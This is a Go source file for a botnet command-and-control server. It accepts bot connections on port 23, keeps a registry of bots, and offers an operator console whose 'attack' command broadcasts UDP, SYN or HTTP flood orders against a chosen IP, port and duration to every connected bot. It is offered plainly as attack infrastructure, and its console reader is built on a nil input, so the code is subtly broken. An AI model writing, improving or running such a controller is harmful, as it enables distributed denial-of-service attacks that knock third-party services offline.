package main

import (
    "bufio"
    "fmt"
    "net"
    "strings"
    "sync"
    "time"
)

type Bot struct {
    Conn     net.Conn
    Addr     string
    Arch     string
    LastPing time.Time
}

var bots = make(map[string]*Bot)
var botsMutex sync.RWMutex

func main() {
    listener, err := net.Listen("tcp", "0.0.0.0:23")
    if err != nil {
        fmt.Println("Failed to listen:", err)
        return
    }
    defer listener.Close()

    fmt.Println("========================================")
    fmt.Println("  Simple CNC - Accepts All Connections")
    fmt.Println("========================================")
    fmt.Println("Listening on port 23")
    fmt.Println("Commands: list, attack, help, exit")
    fmt.Println("========================================")

    go adminConsole()

    for {
        conn, err := listener.Accept()
        if err != nil {
            continue
        }
        go handleBot(conn)
    }
}

func handleBot(conn net.Conn) {
    addr := conn.RemoteAddr().String()
    fmt.Printf("\n[+] Bot connected: %s\n", addr)

    bot := &Bot{Conn: conn, Addr: addr, Arch: "x86_64", LastPing: time.Now()}
    botsMutex.Lock()
    bots[addr] = bot
    botsMutex.Unlock()

    // Keep connection alive
    ticker := time.NewTicker(30 * time.Second)
    defer ticker.Stop()

    for {
        select {
        case <-ticker.C:
            _, err := conn.Write([]byte("PING\n"))
            if err != nil {
                fmt.Printf("[-] Bot %s disconnected\n", addr)
                botsMutex.Lock()
                delete(bots, addr)
                botsMutex.Unlock()
                return
            }
            bot.LastPing = time.Now()
        default:
            conn.SetReadDeadline(time.Now().Add(5 * time.Second))
            buf := make([]byte, 1024)
            n, err := conn.Read(buf)
            if err != nil {
                continue
            }
            if n > 0 {
                fmt.Printf("    From %s: %s", addr, strings.TrimSpace(string(buf[:n])))
            }
        }
    }
}

func adminConsole() {
    reader := bufio.NewReader(nil)

    for {
        fmt.Print("\n> ")
        cmd, _ := reader.ReadString('\n')
        cmd = strings.TrimSpace(cmd)

        parts := strings.Fields(cmd)
        if len(parts) == 0 {
            continue
        }

        switch parts[0] {
        case "list":
            botsMutex.RLock()
            fmt.Printf("\nConnected bots: %d\n", len(bots))
            for addr, bot := range bots {
                fmt.Printf("  %s - last ping: %s\n", addr, bot.LastPing.Format("15:04:05"))
            }
            botsMutex.RUnlock()

        case "attack":
            if len(parts) < 5 {
                fmt.Println("Usage: attack <type> <ip> <port> <duration>")
                fmt.Println("Example: attack udp 172.16.193.192 80 10")
                continue
            }
            atkType := parts[1]
            target := parts[2]
            port := parts[3]
            duration := parts[4]

            cmd := fmt.Sprintf("ATTACK %s %s %s %s\n", atkType, target, port, duration)

            botsMutex.RLock()
            count := 0
            for _, bot := range bots {
                bot.Conn.Write([]byte(cmd))
                count++
            }
            botsMutex.RUnlock()
            fmt.Printf("Attack sent to %d bots\n", count)

        case "help":
            fmt.Println("\nCommands:")
            fmt.Println("  list                     - Show connected bots")
            fmt.Println("  attack <type> <ip> <port> <duration> - Launch attack")
            fmt.Println("  help                     - Show this help")
            fmt.Println("  exit                     - Exit")
            fmt.Println("\nAttack types: udp, syn, http")

        case "exit":
            fmt.Println("Exiting...")
            return

        default:
            fmt.Println("Unknown command. Type 'help'")
        }
    }
}
